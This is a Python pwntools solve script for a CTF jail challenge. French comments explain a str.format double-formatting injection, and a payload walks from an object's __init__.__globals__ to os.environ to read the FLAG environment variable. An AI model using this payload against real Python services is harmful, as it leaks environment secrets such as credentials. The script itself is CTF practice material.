#!/usr/bin/env python3
# Format Strings But Python (Pwny-CTF, Jail)  -  flag dans l'env var FLAG
#
# Faille : str.format injection. num1.__repr__ renvoie notre chaine brute, et
#   "{num1}+{{num2}}".format(num1=num1)  ->  "<notre chaine>+{num2}"
# puis .format(num2=num2) RE-evalue cette chaine comme un nouveau template :
# notre chaine devient un champ de format. On remonte depuis l'objet num2 :
#   num2 -> __init__ -> __globals__ (globals du module, contient `os`)
#        -> [os] -> .environ -> [FLAG]
# Le flag est imprime dans "Here is the expression I will compute:".
from pwn import *

io = remote("chal.sigpwny.com", 7008)

io.sendlineafter(b"first number you want to add? ",
                 b"{num2.__init__.__globals__[os].environ[FLAG]}")
io.sendlineafter(b"second number you want to add? ", b"0")

io.recvuntil(b"compute: ")
print("FLAG LINE:", io.recvline().decode(errors="replace").strip())
io.close()
